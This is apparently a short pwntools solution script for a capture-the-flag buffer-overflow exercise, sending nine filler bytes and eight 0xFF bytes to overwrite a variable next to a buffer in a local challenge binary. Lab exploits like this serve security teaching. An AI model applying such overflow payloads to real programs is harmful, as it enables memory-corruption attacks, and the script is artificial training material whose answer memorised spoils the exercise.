#!/usr/bin/python3

import pwn

proc = pwn.process("/challenge/buffer-overflow-level1.4")
payload = b'a' * 0x9   # 写满缓冲区
payload += b'\xFF' * 0x8   # 覆盖字节变量
print(payload)
proc.sendline(payload)

result = proc.recvall().decode()
for line in result.split('\n'):
    print(line)